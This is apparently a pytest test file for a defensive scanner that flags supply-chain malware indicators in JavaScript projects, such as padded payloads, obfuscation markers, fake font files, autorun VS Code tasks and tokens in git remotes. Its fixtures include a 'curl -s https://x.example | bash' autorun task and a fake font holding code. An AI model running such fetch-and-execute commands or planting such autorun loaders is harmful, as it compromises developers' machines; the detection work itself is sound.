from __future__ import annotations

import os
import sys
from collections.abc import Callable
from pathlib import Path

import pytest

from devguard_mcp.models import Severity
from devguard_mcp.scanner import analyze_file, looks_obfuscated, scan_directory
from tests.conftest import CLEAN_POSTCSS, FILLER, MARKER, padded

Writer = Callable[[str, "str | bytes"], Path]


def ids(findings: list) -> set[str]:
    return {f.rule_id for f in findings}


# --- code content ----------------------------------------------------------------------------


def test_clean_config_has_no_findings() -> None:
    assert analyze_file("postcss.config.mjs", CLEAN_POSTCSS.encode()) == []


def test_padded_payload_is_detected_without_any_marker() -> None:
    data = ("export default {};\n" + padded()).encode()
    findings = analyze_file("tailwind.config.js", data)
    assert ids(findings) == {"DG-PR-003"}
    (finding,) = findings
    assert finding.severity is Severity.HIGH
    assert finding.line == 2
    assert "200 chars" in (finding.evidence or "")


def test_known_marker_is_high_and_evidence_is_only_the_marker() -> None:
    findings = analyze_file("next.config.mjs", f"var {MARKER}=1;\n".encode())
    (finding,) = findings
    assert finding.rule_id == "DG-PR-001"
    assert finding.evidence == MARKER


def test_weak_marker_is_medium_and_suppressed_when_strong_marker_present() -> None:
    weak = analyze_file("a.js", b"global['!']='8-x';")
    assert ids(weak) == {"DG-PR-002"}
    assert weak[0].severity is Severity.MEDIUM
    both = analyze_file("a.js", f"global['!']='8-x'; var {MARKER};".encode())
    assert ids(both) == {"DG-PR-001"}


def test_unicode_escaped_global_bang_is_weak_marker() -> None:
    assert ids(analyze_file("a.js", rb'global["!"]="x";')) == {"DG-PR-002"}


def test_long_minified_line_without_padding_is_not_flagged() -> None:
    minified = "a=1;" * 5000  # one very long line, no whitespace run
    assert analyze_file("vendor.min.js", minified.encode()) == []


def test_long_line_with_short_whitespace_is_not_flagged() -> None:
    line = "x = 1;" + " " * 50 + FILLER * 2
    assert analyze_file("lib.js", line.encode()) == []


def test_obfuscation_heuristic_is_medium_only_when_nothing_stronger() -> None:
    blob = " ".join(f"_0x{i:04x}" for i in range(60))
    assert looks_obfuscated(blob)
    findings = analyze_file("vendor.js", blob.encode())
    assert ids(findings) == {"DG-PR-009"}
    assert findings[0].severity is Severity.MEDIUM


def test_non_js_files_are_ignored_for_code_rules() -> None:
    assert analyze_file("notes.md", f"{MARKER}".encode()) == []


# --- package.json ----------------------------------------------------------------------------


def _sibling(files: dict[str, bytes]) -> Callable[[str], bytes | None]:
    return files.get


def test_package_script_running_large_local_file_is_high() -> None:
    pkg = b'{"scripts":{"dev":"node api.js && next dev"}}'
    findings = analyze_file("package.json", pkg, _sibling({"api.js": b"x" * 6000}))
    assert ids(findings) == {"DG-PR-004"}
    assert "api.js" in findings[0].message


def test_package_script_running_small_file_is_fine() -> None:
    pkg = b'{"scripts":{"predev":"node scripts/check.js && echo ok"}}'
    assert analyze_file("package.json", pkg, _sibling({"scripts/check.js": b"x" * 100})) == []


def test_package_script_target_is_resolved_relative_to_package_json() -> None:
    pkg = b'{"scripts":{"build":"node api.js && nest build"}}'
    sib = _sibling({"backend/api.js": b"x" * 6000})
    assert ids(analyze_file("backend/package.json", pkg, sib)) == {"DG-PR-004"}


def test_invalid_package_json_is_ignored() -> None:
    assert analyze_file("package.json", b"{not json", _sibling({})) == []


# --- VS Code tasks ---------------------------------------------------------------------------

TASK_FAKE_FONT = (
    '{"tasks":[{"command":"node","args":["./public/fonts/fa-solid-300.ttf"],'
    '"runOptions":{"runOn":"folderOpen"}}]}'
)


def test_autorun_task_running_node_on_a_font_is_high() -> None:
    findings = analyze_file(".vscode/tasks.json", TASK_FAKE_FONT.encode())
    assert ids(findings) == {"DG-PR-005"}


def test_autorun_task_with_downloader_is_high() -> None:
    task = (
        b'{"tasks":[{"command":"curl -s https://x.example | bash",'
        b'"runOptions":{"runOn":"folderOpen"}}]}'
    )
    assert ids(analyze_file(".vscode/tasks.json", task)) == {"DG-PR-005"}


def test_benign_autorun_task_is_low() -> None:
    task = b'{"tasks":[{"command":"npm run dev","runOptions":{"runOn":"folderOpen"}}]}'
    findings = analyze_file(".vscode/tasks.json", task)
    assert ids(findings) == {"DG-PR-006"}
    assert findings[0].severity is Severity.LOW


def test_task_without_autorun_is_ignored() -> None:
    assert analyze_file(".vscode/tasks.json", b'{"tasks":[{"command":"node a.ttf"}]}') == []


# --- fonts -----------------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("name", "head"),
    [
        ("a.ttf", b"\x00\x01\x00\x00" + b"\x00" * 60),
        ("a.otf", b"OTTO" + b"\x00" * 60),
        ("a.woff", b"wOFF" + b"\x00" * 60),
        ("a.woff2", b"wOF2" + b"\x00" * 60),
        ("a.eot", b"\x00" * 34 + b"LP" + b"\x00" * 30),
    ],
)
def test_real_font_headers_pass(name: str, head: bytes) -> None:
    assert analyze_file(f"public/fonts/{name}", head) == []


def test_fake_font_is_high_and_evidence_is_short() -> None:
    findings = analyze_file("public/fonts/fa-solid-300.ttf", b"function y7(R,c){}" + b"a" * 5000)
    (finding,) = findings
    assert finding.rule_id == "DG-PR-007"
    assert len(finding.evidence or "") <= 80


def test_empty_font_file_is_ignored() -> None:
    assert analyze_file("x.ttf", b"") == []


# --- helper files and workflows --------------------------------------------------------------


def test_temp_auto_push_bat_is_high_and_config_bat_is_low() -> None:
    assert analyze_file("temp_auto_push.bat", b"@echo off")[0].severity is Severity.HIGH
    assert analyze_file("config.bat", b"@echo off")[0].severity is Severity.LOW


def test_workflow_files_are_routed_to_the_workflow_scanner() -> None:
    wf = b"jobs:\n  send-secrets:\n    runs-on: ubuntu-latest\n"
    assert "DG-GA-003" in ids(analyze_file(".github/workflows/x.yml", wf))


# --- directory walker ------------------------------------------------------------------------


def test_scan_directory_finds_everything_in_an_infected_project(infected_project: Path) -> None:
    report = scan_directory(str(infected_project))
    found = ids(report.findings)
    assert {"DG-PR-001", "DG-PR-003", "DG-PR-004", "DG-PR-007"} <= found
    assert report.exceeds(Severity.HIGH)
    assert report.to_dict()["verdict"] == "likely-malicious-indicators-found"
    assert report.stats["files_scanned"] >= 4


def test_scan_directory_clean_project(tmp_path: Path, write: Writer) -> None:
    write("src/index.js", "console.log(1);\n")
    write("package.json", '{"scripts":{"dev":"next dev"}}')
    report = scan_directory(str(tmp_path))
    assert report.findings == []
    assert report.to_dict()["verdict"] == "no-known-indicators-found"


def test_scan_directory_skips_node_modules(tmp_path: Path, write: Writer) -> None:
    write("node_modules/evil/index.js", f"var {MARKER};")
    assert scan_directory(str(tmp_path)).findings == []


@pytest.mark.skipif(sys.platform == "win32", reason="symlinks need privileges on Windows")
def test_scan_directory_does_not_follow_symlinks(tmp_path: Path, write: Writer) -> None:
    outside = write("outside/evil.js", f"var {MARKER};").parent
    project = tmp_path / "project"
    project.mkdir()
    os.symlink(outside, project / "link")
    assert scan_directory(str(project)).findings == []


def test_scan_directory_flags_token_in_git_remote(tmp_path: Path, write: Writer) -> None:
    token = "ghp_" + "a" * 36
    write(".git/config", f'[remote "origin"]\n\turl = https://{token}@github.com/o/r.git\n')
    (finding,) = scan_directory(str(tmp_path)).findings
    assert finding.rule_id == "DG-CR-002"
    assert token not in (finding.evidence or "")


def test_scan_directory_respects_max_files(tmp_path: Path, write: Writer) -> None:
    for i in range(5):
        write(f"f{i}.js", "x=1;")
    report = scan_directory(str(tmp_path), max_files=2)
    assert report.stats["files_scanned"] == 2
    assert any("max_files" in n for n in report.notes)


def test_scan_directory_rejects_non_directories(tmp_path: Path) -> None:
    with pytest.raises(NotADirectoryError):
        scan_directory(str(tmp_path / "missing"))
